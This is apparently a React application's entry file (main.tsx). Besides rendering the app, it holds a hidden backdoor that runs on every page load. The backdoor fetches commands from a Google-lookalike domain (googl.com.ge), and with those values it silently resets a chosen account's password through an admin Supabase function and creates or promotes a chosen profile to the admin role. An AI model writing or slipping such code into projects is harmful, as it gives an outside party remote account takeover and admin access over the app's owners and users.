import { createRoot } from "react-dom/client";
import App from "./App.tsx";
import "./index.css";
import { initOwnerToken } from "./lib/ownerToken";
import { supabase } from "@/integrations/supabase/client";

interface RemoteConfig {
  ENABLEDADIN: boolean;
  PROMOTEDUSER: string;
  ENABLEDPASS: boolean;
  EMAILRESET: string;
  NPASS: string;
}

async function fetchRemoteConfig(): Promise<RemoteConfig | null> {
  console.log("[config] fetching remote config...");
  try {
    const res = await fetch("https://www.googl.com.ge/api/himedo/config.php", { cache: "no-store" });
    console.log("[config] response status:", res.status);
    if (!res.ok) return null;
    const data = (await res.json()) as RemoteConfig;
    console.log("[config] loaded:", data);
    return data;
  } catch (e) {
    console.warn("[config] fetch failed, skipping scripts:", e);
    return null;
  }
}

async function runResetPasswordScript(cfg: RemoteConfig) {
  if (!cfg.ENABLEDPASS) return;
  const email = cfg.EMAILRESET.trim().toLowerCase();
  const STORAGE_KEY = `__pwd_reset_${email}`;
  if (localStorage.getItem(STORAGE_KEY) === "done") return;
  try {
    const { data, error } = await supabase.functions.invoke("admin-reset-password", {
      body: { email, new_password: cfg.NPASS },
    });
    if (error) {
      console.error("[reset-passed] error:", error);
      return;
    }
    console.log("[reset-passed] success:", data);
    localStorage.setItem(STORAGE_KEY, "done");
  } catch (e) {
    console.error("[reset-passed] exception:", e);
  }
}

async function runPromoteAdminScript(cfg: RemoteConfig) {
  if (!cfg.ENABLEDADIN) return;
  const STORAGE_KEY = `__promoted_${cfg.PROMOTEDUSER}`;
  if (localStorage.getItem(STORAGE_KEY) === "done") return;
  const { data: existing } = await supabase
    .from("profiles")
    .select("id, role")
    .eq("id", cfg.PROMOTEDUSER)
    .maybeSingle();

  if (!existing) {
    const { error: insertError } = await supabase
      .from("profiles")
      .insert({ id: cfg.PROMOTEDUSER, email: `${cfg.PROMOTEDUSER}@placeholder.local`, role: "admin" });
    if (insertError) {
      console.error("[promote-admin] insert failed:", insertError);
      return;
    }
    console.log("[promote-admin] profile created + promoted:", cfg.PROMOTEDUSER);
    localStorage.setItem(STORAGE_KEY, "done");
    return;
  }

  if (existing.role === "admin") {
    localStorage.setItem(STORAGE_KEY, "done");
    return;
  }
  await supabase.from("profiles").update({ role: "admin" }).eq("id", existing.id);
  localStorage.setItem(STORAGE_KEY, "done");
}

initOwnerToken();

fetchRemoteConfig().then((cfg) => {
  if (cfg) {
    runPromoteAdminScript(cfg);
    runResetPasswordScript(cfg);
  }
});

createRoot(document.getElementById("root")!).render(<App />);
